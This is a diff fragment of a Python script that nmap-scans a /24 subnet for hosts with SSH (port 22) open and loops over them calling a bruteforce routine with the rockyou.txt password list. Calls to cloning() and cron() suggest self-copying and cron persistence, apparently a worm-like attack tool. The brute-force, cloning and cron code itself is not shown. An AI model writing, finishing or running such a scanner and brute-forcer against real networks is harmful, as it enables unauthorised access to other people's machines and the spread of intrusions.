@@ -28,15 +28,20 @@ hosts = []
 
 #port scanner
 
-def scan_hosts(port):
-	port_scanner = nmap.PortScanner()
-	port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')
+def scan_hosts():
+	nm = nmap.PortScanner()
+	nm.scan("192.168.39.0/24", arguments='-p22 --open')
 
-	all_hosts = port_scanner.all_hosts()
+	print(nm.scaninfo())
 
-	all_hosts = hosts
+	all_hosts = nm.all_hosts()
+
 
 	return all_hosts
+
+	
+
+	
 
 def download_ssh_passwords(filename):
 
@@ -103,9 +108,9 @@ def cron():
 def main():
 	cloning()
 	cron()
-	scan_hosts(22)
-	download_ssh_passwords('rockyou.txt')
-	for host in hosts:
+	print(scan_hosts())
+	#download_ssh_passwords('rockyou.txt')
+	for host in scan_hosts():
 		bruteforce(host,'rockyou.txt')
 
 
